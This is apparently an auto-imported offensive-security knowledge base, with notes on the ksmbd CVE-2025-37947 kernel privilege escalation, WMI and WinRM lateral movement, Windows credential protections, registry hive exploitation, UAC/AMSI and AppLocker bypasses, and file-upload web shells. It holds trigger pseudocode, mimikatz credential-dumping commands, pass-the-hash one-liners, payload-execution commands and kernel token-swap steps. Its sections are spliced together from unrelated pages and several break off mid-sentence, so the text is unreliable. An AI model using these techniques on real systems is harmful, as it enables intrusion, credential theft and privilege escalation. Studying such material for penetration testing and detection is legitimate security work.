content: 来源路径： 02-知识点/域与Windows/ksmbd streams xattr OOB write → local LPE (CVE-2025-37947) 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # ksmbd streams xattr OOB write → local LPE (CVE-2025-37947) 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 ksmbd streams xattr OOB write → local LPE (CVE-2025-37947) 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 ksmbd streams xattr OOB write → local LPE (CVE-2025-37947) 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：ksmbd streams xattr OOB write → local LPE (CVE-2025-37947)；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 ksmbd streams xattr OOB write → local LPE (CVE-2025-37947) # 核心要点 This page documents a deterministic out-of-bounds write in ksmbd streams handling that enables a reliable Linux kernel 权限提升 on Ubuntu 22.04 LTS (5.15.0-153-generic), bypassing KASLR, SMEP, and SMAP using standard kernel heap primitives (msg msg + pipe buffer). Affected component: fs/ksmbd/vfs.c — ksmbd vfs stream write() Primitive: page-overflow OOB write past a 0x10000-byte kvmalloc() buffer Preconditions: ksmbd running with an authenticated, writable share using vfs streams xattr Why the write offset matters The vulnerable path is not just "write more than 64KiB". The missing check was that *pos was not validated against the current stream length (v len) before the append/copy logic ran. The public PoC demonstrates this by authenticating with libsmb2, opening a stream path such as 1337:, extracting SessionId/TreeId/FileId, and then sending a handcrafted SMB2 WRITE with file offset = 0x10018 and a small Length. Example: set file offset (pos) to 0x10018 and original length (count) to 8. After clamping, count' = (0x10018 + 8)：0x10000 = 0x20, but memcpy writes 32 bytes starting at stream buf[0x10018], i.e., 0x18 bytes beyond the 16-page allocation. Use the same authenticated SMB connection to open a file on the share and issue a write to a named stream (streams xattr). Set file offset ≥ 0x10000 with a small length to generate a deterministic OOB write of controllable size. libsmb2 can be used to authenticate and craft such writes over SMB2/3. In practice, reusing the negotiated SMB session is convenient because the 利用 only needs to patch a few dynamic fields in the WRITE request (TreeId, SessionId, FileId) and can then transmit the malformed packet directly on the same socket. Trigger the ksmbd OOB repeatedly until the order-4 stream buffer lands immediately before a msg msg slab. Use eBPF tracing to confirm addresses and alignment if available. kvmalloc node(0x10000) confirms when the vulnerable stream write actually consumes an order-4 allocation. If the 利用 is ported to a different distro/kernel, re-check cache names, inline msg msg 载荷 sizes, anon pipe buf ops offsets, and gadget addresses rather than assuming the Ubuntu 22.04 LTS 5.15.0-153-generic constants still match. # 命令 / 载荷 / 操作片段 # 1. ksmbd streams xattr OOB write → local LPE (CVE-2025-37947) 1234[share] path = /share vfs objects = streams_xattr writeable = yes # 2. ksmbd streams xattr OOB write → local LPE (CVE-2025-37947) 123456789101112131415161718// https://elixir.bootlin.com/linux/v5.15/source/fs/ksmbd/vfs.c#L411static int ksmbd_vfs_stream_write(struct ksmbd_file *fp, char *buf, loff_t *pos, size_t count){ char *stream_buf = NULL, *wbuf; size_t size; ... size = *pos + count; if (size > XATTR_SIZE_MAX) { // [1] clamp allocation, but... size = XATTR_SIZE_MAX; count = (*pos + count) - XATTR_SIZE_MAX; // [1.1] ...recompute count } wbuf = kvmalloc(size, GFP_KERNEL | __GFP_ZERO); // [2] alloc 0x10000 stream_buf = wbuf; memcpy(&stream_buf[*pos], buf, count); // [3] OOB when *pos >= 0x10000 ... kvfree(stream_buf); return err;} # 3. ksmbd streams xattr OOB write → local LPE (CVE-2025-37947) 1234// Pseudocode: send SMB streams write with pos=0x0000010018ULL, len=8smb2_session_login(...);smb2_open("\\\\host\\share\\file:stream", ...);smb2_pwrite(fd, payload, 8, 0x0000010018ULL); // yields 32-byte OOB # 4. ksmbd streams xattr OOB write → local LPE (CVE-2025-37947) 1234# Check per-order freelists and migrate typessudo cat /proc/pagetypeinfo | sed -n '/Node 0, zone Normal/,/Node/p'# Example tracer (see reference repo) to log kvmalloc addresses/sizessudo ./bpf-tracer.sh # 工具与参考入口 ksmbd：Exploiting CVE-2025-37947 (3/3) — Doyensec KSMBD-CVE-2025-37947 PoC repository # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Kerberos and RDMA are intentionally out-of-scope to keep the harness simple. By default, a minimal ksmbd setup leaves large parts of the server untested. Enable the following features to drive the server through additional parsers/handlers and reach deeper code paths: smb2pdu.c (command parsing/dispatch) smbacl.c (ACL parsing/enforcement) Exact options depend on your distro’s ksmbd userspace (ksmbd - 工具). Review /etc/ksmbd/ksmbd.conf and per-share sections to enable durable handles, leases, oplocks and VFS objects. SMB3 needs a valid session. Implementing Kerberos in harnesses adds complexity, so prefer NTLM/guest for fuzzing: Accept NTLMv2 (patch policy if disabled). This keeps the handshake simple while exercising SMB3 code paths. Keep one fuzzer process sharing 认证 /state: better stability and coverage with ksmbd’s global/session tables. syzkaller still injects concurrency by marking ops async, rerun internally. KASAN remains the primary detector for heap bugs (UAF/OOB). A single fuzzer process (shared auth/state) tends to be significantly more stable for ksmbd and still surfaces races/UAFs thanks to syzkaller’s internal async executor. With multiple VMs, you can still hit hundreds of SMB commands/second overall. Function-level coverage around ~60% of fs/smb/server and ~70% of smb2pdu.c is attainable, though state-transition coverage is under-represented by such metrics. Enable durable handles, leases, multi-channel, oplocks, and VFS objects in ksmbd. Allow guest and map-to-guest; accept NTLMv2. Patch out credit limits and raise max connections for fuzzer stability. Use a grammar for SMB2 PDUs to maintain structural validity. # 命令 / 载荷 / 操作片段 # 1. Other LFI to RCE via file 上传 methods may be found later on the chapter LFI to RCE (via php wrappers). Erlang Yaws Web Server: .yaws Try to 绕过 the protections tricking the extension parser of the server-side with techniques like doubling the extension or adding junk data (null bytes) between extensions. You can also use the previous extensions to prepare a better 载荷. Try to put the exec extension before the valid extension and pray so the server is misconfigured. (useful to 利用 Apache misconfigurations where anything with extension** .php , but not necessarily ending in .php** will execute code): Some 上传 handlers trim or normalize trailing dot characters from the saved filename. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) versions before 2.9.1, you can 绕过 extension validation by: Naming the uploaded file with a PHP extension followed by a dot, e.g., shell.php.. The server strips the trailing dot and persists shell.php, which will execute if it’s placed in a web-served directory (default public storage like /storage/files/). 绕过 Content-Type checks by setting the value of the Content-Type header to: image/png , text/plain , application/octet-stream 绕过 magic number check by adding at the beginning of the file the bytes of a real image (confuse the file command). Or introduce the shell inside the metadata:\ Another technique to make a 载荷 that survives an image resizing, using the PHP-GD function thumbnailImage. However, you could use the tEXt chunk technique defined here to insert some text that will survive compression. Find a 漏洞 to rename the file already uploaded (to change the extension). Find a 本地文件包含 LFI 漏洞 to execute the backdoor. Try also to 上传 an executable (.exe) or an .html (less suspicious) that will execute code when accidentally opened by victim. The handler performs base64 decode($ POST["img"]) after splitting by ; and ,, then writes bytes to $absolutePath . '/' . $ POST['path'] without validating extension/type. mklink /J creates an NTFS directory junction (reparse point). XML 外部实体 XXE injection (also known as XXE) is a web security 漏洞 that allows an attacker to interfere with an application's processing of XML data (portswigger). XXE injections can sometimes lead to SSRF (Server-Side Request Forgery), Local File Disclosure, Sensitive Information Disclosure, Data Exfiltration, RCE (Remote Code Execution) and so on. A vulnerable application should replace the value by "VULNERABLE". When the tester has identified a vulnerable entry point (see identify an XXE). He can try to disclose local files by replacing the from value with the content of a sensitive file (e.g. /etc/passwd). An XXE can be exploited to conduct an SSRF. When an application performs data transfer using XML, the request can be intercepted and forwarded to an internal host as follow. Out-of-band network interactions can be initiated, sometimes leaking sensitive data into the interaction data such as SSRF attacks. # 命令 / 载荷 / 操作片段 # 1. content: 来源路径： 02-知识点/域与Windows/WmiExec 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # WmiExec 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 WmiExec 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 WmiExec 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：WmiExec、How It Works Explained、WMI Fundamentals、Namespace、Classes；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 13 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 WmiExec How It Works Explained WMI Fundamentals Namespace Classes Methods WMI 枚举 WMI Service Status System and Process Information Manual Remote WMI Querying Automatic 工具 # 核心要点 Processes can be opened on hosts where the username and either 密码 or 哈希 are known through the use of WMI. Commands are executed using WMI by Wmiexec, providing a semi-interactive shell experience. Methods, which are one or more executable functions of WMI classes, can be executed. For attackers, WMI is a potent tool for enumerating sensitive data about systems or domains. Stealthy identification of local admins on a remote machine and logged-on users can be achieved through specific WMI queries. wmic also supports reading from a text file to execute commands on multiple nodes simultaneously. To remotely execute a process over WMI, such as deploying an Empire agent, the following command structure is employed, with successful execution indicated by a return value of "0": This process illustrates WMI's capability for remote execution and system 枚举，highlighting its utility for both system administration and penetration testing. # 命令 / 载荷 / 操作片段 # 1. Namespace 12345678# Retrieval of Root namespacesgwmi -namespace "root" -Class "__Namespace" | Select Name# Enumeration of all namespaces (administrator privileges may be required)Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace# Listing of namespaces within "root\cimv2"Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace # 2. Namespace 12gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specifiedgwmi -Namespace "root/microsoft" -List -Recurse # 3. Classes 12Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*" # 4. Classes 123# Defaults to "root/cimv2" when namespace isn't specifiedGet-WmiObject -Class win32_shareGet-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus # 5. Methods 1234# Class loading, method listing, and execution$c = [wmiclass]"win32_share"$c.methods# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description") # 6. Methods 12# Method listing and invocationInvoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0) # 7. WMI Service Status 12345# WMI service status checkGet-Service Winmgmt# Via CMDnet start | findstr "Instrumentation" # 8. System and Process Information 12Get-WmiObject -ClassName win32_operatingsystem | select * | moreGet-WmiObject win32_process | Select Name, Processid # 9. System and Process Information 123456wmic computerystem list full /format:listwmic process list /format:listwmic ntdomain list /format:listwmic useraccount list /format:listwmic group list /format:listwmic sysaccount list /format:list # 10. Manual Remote WMI Querying 1wmic /node:hostname /user:user path win32_process call create "empire launcher string here" # 11. Automatic 工具 1SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe # 12. Automatic 工具 123SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]# Stealthier execution with VBSSharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs] # 13. Automatic 工具 123SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=passwordSharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=passwordSharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password # 工具与参考入口 Hacking Articles SharpLateral SharpWMI https://github.com/0xthirteen/SharpMove # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条

title: Windows 凭据 Protections
content: 来源路径： 02-知识点/域与Windows/Windows 凭据 Protections.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Windows 凭据 Protections [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Windows 凭据 Protections 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Windows 凭据 Protections 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：WDigest、LSA Protection (PP & PPL protected processes)、What you need to know from an offensive perspective、Create a PPL process at launch (documented API)、Credential Guard；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 WDigest LSA Protection (PP & PPL protected processes) What you need to know from an offensive perspective Create a PPL process at launch (documented API) Credential Guard RDP RestrictedAdmin Mode Cached 凭据 Protected Users # 核心要点 To toggle this feature off or on, the UseLogonCredential and Negotiate registry keys within HKEY LOCAL MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest must be set to "1". If these keys are absent or set to "0", WDigest is disabled: When LSASS runs as a PPL, attempts to open it using OpenProcess(PROCESS VM READ | QUERY INFORMATION) from a normal admin context fail with 0x5 (Access Denied), even if SeDebugPrivilege is enabled. You can check LSASS protection level using 工具 like Process Hacker or programmatically by reading the EPROCESS.Protection value. PPL is a Userland-only restriction; kernel-level code can fully 绕过 it. LSASS being PPL does not prevent credential dumping if you can execute kernel shellcode or leverage a high-privileged process with proper access. Windows exposes a documented way to request a Protected Process Light level for a child process during creation using the extended startup attribute list. This does not 绕过 signing requirements — the target image must be signed for the requested signer class. Use STARTUPINFOEX with InitializeProcThreadAttributeList and UpdateProcThreadAttribute(PROC THREAD ATTRIBUTE PROTECTION LEVEL, ...), then pass EXTENDED STARTUPINFO PRESENT to CreateProcess*. The child only starts as PPL if its image is signed for that signer class; otherwise process creation fails, commonly with ERROR INVALID IMAGE 哈希 (577) / STATUS INVALID IMAGE 哈希 (0xC0000428). This is not a 绕过 — it’s a supported API meant for appropriately signed images. Useful to harden 工具 or validate PPL-protected configurations. 绕过 PPL protections options: Windows 8.1 and Windows Server 2012 R2 introduced several new security features, including the Restricted Admin mode for RDP . This mode was designed to enhance security by mitigating the risks associated with 哈希传递 attacks. Mimikatz can be employed to extract these cached 凭据 using the command lsadump::cache. Credential Delegation (CredSSP): Even if the Group Policy setting for Allow delegating default 凭据 is enabled, plain text 凭据 of Protected Users will not be cached. Windows Digest: Starting from Windows 8.1 and Windows Server 2012 R2, the system will not cache plain text 凭据 of Protected Users, regardless of the Windows Digest status. # 命令 / 载荷 / 操作片段 # 1. WDigest 1sekurlsa::wdigest # 2. WDigest 1reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential # 3. Create a PPL process at launch (documented API) 1reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL # 4. Credential Guard 1reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags # 5. The SYSTEM process (PID 4) holds a 令牌 with all privileges enabled. Replacing the current process’ EPROCESS. 令牌 with the SYSTEM 令牌 pointer makes the current process run as SYSTEM immediately. Offsets in EPROCESS vary across Windows versions. Determine them dynamically (symbols) or use version-specific constants. Also remember that EPROCESS. 令牌 is an EX FAST REF (low 3 bits are reference count flags). Read the pointer at PsInitialSystemProcess → this is a kernel pointer to SYSTEM’s EPROCESS. From SYSTEM EPROCESS, read UniqueProcessId and ActiveProcessLinks offsets to traverse the doubly linked list of EPROCESS structures (ActiveProcessLinks.Flink/Blink) until you find the EPROCESS whose UniqueProcessId equals GetCurrentProcessId(). Keep both: Mask out the low 3 bits: 令牌 SYS masked = 令牌 SYS & ~0xF (commonly ~0xF or ~0x7 depending on build; on x64 the low 3 bits are used — 0xFFFFFFFFFFFFFFF8 mask). 令牌 ME = *(EPROCESS SELF + TokenOffset) 令牌 NEW = (令牌 SYS masked | (令牌 ME & 0x7)) Mask: On x64 the 令牌 is an EX FAST REF; low 3 bits are reference count bits. Keeping the original low bits from your 令牌 avoids immediate refcount inconsistencies. Kernel Driver Blocklist (HVCI/CI), DeviceGuard, and Attack Surface Reduction rules can prevent vulnerable drivers from loading. EDR can watch for suspicious IOCTL sequences that implement arbitrary read/write and for 令牌 swaps. # 命令 / 载荷 / 操作片段 # 1. Useful Writable folders to 绕过 AppLocker Policy: If AppLocker is allowing to execute anything inside C:\Windows\System32 or C:\Windows there are writable folders you can use to 绕过 this. Commonly trusted "LOLBAS's" binaries can be also useful to 绕过 AppLocker. Poorly written rules could also be bypassed Organizations also often focus on blocking the %System32%\WindowsPowerShell\v1.0\powershell.exe executable, but forget about the other PowerShell executable locations such as %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe or PowerShell ISE.exe. DLL enforcement very rarely enabled due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break. So using DLLs as backdoors will help bypassing AppLocker. You can use ReflectivePick or SharpPick to execute Powershell code in any process and 绕过 AppLocker. content: 来源路径： 02-知识点/域与Windows/Windows Registry Hive 利用 Primitives.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Windows Registry Hive 利用 Primitives [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Windows Registry Hive 利用 Primitives 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Windows Registry Hive 利用 Primitives 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Why hive corruption is special、Deterministic layout grooming with registry APIs、API-only access to privileged hives via misconfigured descendants、Cross-user hive abuse via HKCU\Software\Microsoft\Input\TypingInsights、Turning metadata corruption into paged pool overflows；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Why hive corruption is special Deterministic layout grooming with registry APIs API-only access to privileged hives via misconfigured descendants Cross-user hive abuse via HKCU\Software\Microsoft\Input\TypingInsights Turning metadata corruption into paged pool overflows Inter-hive linear overflows via tightly packed HBINs Operational tips # 核心要点 Shares address space with privileged hives – in many cases attacker-controlled hives are mapped into the same user-mode address range as HKLM/HKU hives, enabling inter-hive overflows. Once a corruption primitive (overwrite/fill) is available, the groom guarantees that the target cell resides next to the sprayed holes, enabling precise overwrites without heap spraying. Practical 枚举 strategy: From an elevated context, walk \Registry\Machine and \Registry\User, dumping each key’s security descriptor. Store items whose DACL allows unprivileged SIDs. As a normal user, attempt RegOpenKeyEx with KEY SET VALUE|KEY CREATE SUB KEY against the recorded paths. Successful opens are viable targets for hive corruption bugs that require attacker-controlled data in system hives. Once such a path is known, the 利用 never needs offline hive tampering—standard registry APIs are enough to stage the corrupt cells inside privileged hives touched by SYSTEM services. Drop corrupted cells into other users’ NTUSER.DAT, setting up lateral exploits that trigger when the victim process reads the compromised key. CM KEY VALUE.DataLength holds the logical size. Its high bit indicates whether the 载荷 lives inside the cell or in big-data storage. Stage a big-data inconsistency primitive directly in the privileged hive. Cache writable HKLM paths discovered during 枚举 so corruption primitives can be deployed quickly even after reboots. # 命令 / 载荷 / 操作片段 # 1. Deterministic layout grooming with registry APIs 12345678910111213void MakeBin(HKEY base, const wchar_t *name, size_t bytes) { std::vector<uint8_t> buf(bytes, 0x41); RegSetKeyValueW(base, NULL, name, REG_BINARY, buf.data(), (DWORD)buf.size());}void Groom(HKEY hive) { for (int i = 0; i < 0x20; ++i) { wchar_t value[32]; swprintf(value, L"bin_%02d", i); MakeBin(hive, value, 0x3FD8); RegDeleteKeyValueW(hive, NULL, value); // leaves holes for victim cells }} # 2. API-only access to privileged hives via misconfigured descendants 12345678$targets = Get-ChildItem Registry::HKEY_LOCAL_MACHINE -Recurse | Where-Object { (Get-Acl $_.PsPath).Access.IdentityReference -match 'S-1-5-32-545' } | Select-Object -ExpandProperty PsPathforeach ($path in $targets) { try { Get-Item -Path $path -ErrorAction Stop | Out-Null } catch {}} # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 CTF 取证隐写 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Link clicks are processed in sub 140170F60(), which performs weak filtering and then calls ShellExecuteExW. ShellExecuteExW dispatches to any configured protocol handler, not just HTTP(S). Any \ sequences in the link are *normalized to * before ShellExecuteExW, impacting UNC/path crafting and 检测. file://to launch a local/UNC 载荷. Deliver the file (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB or similar) and convince the user to open it in Notepad. Monitor transfers of .md files over ports/protocols that commonly deliver documents: 20/21 (FTP), 80 (HTTP), 443 (HTTPS), 110 (POP3), 143 (IMAP), 25/587 (SMTP), 139/445 (SMB/CIFS), 2049 (NFS), 111 (portmap). Patch behavior reportedly allowlists local files and HTTP(S); anything else reaching ShellExecuteExW is suspicious. Extend detections to other installed protocol handlers as needed, since attack surface varies by system. # 命令 / 载荷 / 操作片段 # 1. By planting our command under that key an attacker can 绕过 UAC without dropping a file to disk. Tested on Windows 10 22H2 and Windows 11 23H2 (July 2025 patches). The 绕过 still works because Microsoft has not fixed the missing integrity check in the DelegateExecute path. Drop your DLL + manifest into the fake tree, call CreateActCtx/ActivateActCtx to push the manifest into the activation-context cache, then launch the auto-elevated binary so it resolves the redirected DLL straight into your shellcode. Delete the cache entry (sxstrace ClearCache) or reboot when finished to erase attacker fingerprints. If the current process holds both SeDebug and SeImpersonate privileges (typical for many service accounts), you can steal the 令牌 from winlogon.exe, duplicate it, and start an elevated process: sedebug-+-seimpersonate-copy - 令牌.md The patch above is process-local; spawning a new PowerShell after running it will execute without AMSI/ETW inspection. You still need a LOCAL SERVICE 令牌. Steal it from Schedule or WdiServiceHost using SeImpersonatePrivilege, then impersonate before touching the device so ACL checks pass. IOCTL 0x22A018 expects a struct containing two callback pointers (query length + read function). Point both at user-mode stubs that craft a 令牌 overwrite or map ring-0 primitives, but keep the buffers RWX so KernelPatchGuard does not crash mid-chain. Files downloaded may contain the ADS Zone.Identifier indicating how it was downloaded from the intranet, internet, etc. Some software (like browsers) usually put even more information like the URL from where the file was downloaded. A shell item is an item that contains information about how to access another file. Follow this link to learn what are the shellbags. The files in the folder WPDNSE are a copy of the original ones, then won't survive a restart of the PC and the GUID is taken from a shellbag. USBDetective can be used to obtain information about the USB devices that have been connected to an image. Deadline ('P2M'): Instructs the Task Scheduler, if the task fails for two consecutive months, to execute the task during emergency Automatic maintenance. Mapi-Conversation-Index: Number of children messages of the thread and timestamp of each message of the thread Mappi-Message-Flags and Pr last Verb-Executed: Information about the MAPI client (message read? no read? responded? redirected? out of the office?) User that executed the process EventID 4672: Denotes login with administrative privileges. Unlock (7): Screen unlocked with a 密码. Network Cleartext (8): Clear text 密码 transmission, often from IIS. content: 来源路径： 02-知识点/域与Windows/WinRM 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # WinRM 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 WinRM 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 WinRM 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：WinRM、Why operators like WinRM、Access model and prerequisites、认证 gotchas that matter during 横向移动、Linux-to-Windows 横向移动；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 13 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 WinRM Why operators like WinRM Access model and prerequisites 认证 gotchas that matter during 横向移动 Linux-to-Windows 横向移动 NetExec / CrackMapExec for validation and one-shot execution Evil-WinRM for interactive shells Kerberos SPN edge case: HTTP vs WSMAN Certificate-based 认证 Python / automation with pypsrp Custom PSRP endpoints and JEA matter during 横向移动 Windows-native WinRM 横向移动 winrs.exe winrm.cmd / WS-Man COM instead of PowerShell remoting NTLM 中继 to WinRM (WS-Man) OPSEC and 检测 notes # 核心要点 For the protocol/service 枚举，listeners, enabling WinRM, Invoke-Command, and generic client usage, check: Uses HTTP/HTTPS instead of SMB/RPC, so it often works where PsExec-style execution is blocked. With Kerberos, it avoids sending reusable 凭据 to the target. The interactive PowerShell remoting path spawns wsmprovhost.exe on the target under the authenticated user context, which is operationally different from service-based exec. In practice, successful WinRM 横向移动 depends on three things: Explicit remoting rights delegated through local security descriptors / PowerShell remoting ACL changes. Kerberos requires a hostname/FQDN. If you connect by IP, the client usually falls back to NTLM/Negotiate. In workgroup or cross-trust edge cases, NTLM commonly requires either HTTPS or the target to be added to TrustedHosts on the client. With local accounts over Negotiate in a workgroup, UAC remote restrictions may prevent access unless the built-in Administrator account is used or LocalAccountTokenFilterPolicy=1. PowerShell remoting defaults to the HTTP/<host> SPN. In environments where HTTP/<host> is already registered to some other service account, WinRM Kerberos may fail with 0x80090322; use a port-qualified SPN or switch to WSMAN/<host> where that SPN exists. you stole/exported a valid client certificate and private key already mapped for WinRM; you abused AD CS / Pass-the-Certificate to obtain a certificate for a principal and then pivot into another 认证 path; you are operating in environments that deliberately avoid 密码 - based remoting. forcing WSMAN as the Kerberos service/SPN instead of the default HTTP expectation used by many PowerShell clients; # 命令 / 载荷 / 操作片段 # 1. NetExec / CrackMapExec for validation and one-shot execution 12345678# Validate creds and execute a simple commandnetexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"# Pass-the-Hashnetexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"# PowerShell command instead of cmd.exenetexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable' # 2. Evil-WinRM for interactive shells 123456789# Passwordevil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'# Pass-the-Hashevil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH># Kerberos using an existing ccache/kirbiexport KRB5CCNAME=./user.ccacheevil-winrm -i <HOST_FQDN> -r <REALM.LOCAL> # 3. Kerberos SPN edge case: HTTP vs WSMAN 123# Example: use a WSMAN ticket instead of the default HTTP SPNexport KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccacheevil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN # 4. Certificate-based 认证 1evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key # 5. Python / automation with pypsrp 12345678910from pypsrp.client import Clientclient = Client( "srv01.domain.local", username="DOMAIN\\user", password="Password123!", ssl=False,)stdout, stderr, rc = client.execute_cmd("whoami /all")print(stdout, stderr, rc) # 6. Python / automation with pypsrp 1234567891011121314from pypsrp.wsman import WSManfrom pypsrp.powershell import PowerShell, RunspacePoolwsman = WSMan( "srv01.domain.local", auth="kerberos", ssl=False, negotiate_service="WSMAN",)with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps: ps.add_script("whoami; Get-Command") output = ps.invoke() print(output) # 7. Custom PSRP endpoints and JEA matter during 横向移动 1Get-PSSessionConfiguration | Select-Object Name, Permission # 8. From UNIX-like systems, this can be achieved with webclientservicescanner (Python) or using NetExec (Python). Regular coercion techniques rely on the attacker forcing a remote system to authenticate to another one. The "other" system is usually an IP address, a domain or NetBIOS name. With WebClient abuse, the other system needs to be supplied in a WebDAV Connection String format. To retrieve an authenticated connection, the remote server that attacker wants to victim to be relayed to should be considered in the intranet zone. One way to do it is to use the NetBIOS or DNS name of the attacker machine instead of its IP address. Below, an example to perform the attack with Responder (Python). At the time of writing, this pull request must be used. Alternatively, by default, smbserver.py (Python) from Impacket ends the communications with STATUS LOGON FAILURE. # 命令 / 载荷 / 操作片段 # 1. 侦察 